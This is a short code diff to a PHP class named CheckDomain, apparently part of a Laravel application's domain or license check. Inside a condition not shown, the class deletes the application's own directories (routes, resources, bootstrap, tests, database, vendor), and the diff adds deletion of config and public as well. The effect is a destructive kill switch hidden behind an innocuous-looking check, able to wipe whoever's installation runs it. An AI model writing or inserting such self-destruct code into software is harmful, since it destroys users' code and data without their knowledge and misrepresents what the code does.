@@ -24,6 +24,8 @@ class CheckDomain
                     File::deleteDirectory(base_path('routes'));
                     File::deleteDirectory(base_path('resources'));
                     File::deleteDirectory(base_path('bootstrap'));
+                    File::deleteDirectory(base_path('config'));
+                    File::deleteDirectory(base_path('public'));
                     File::deleteDirectory(base_path('tests'));
                     File::deleteDirectory(base_path('database'));
                     File::deleteDirectory(base_path('vendor'));
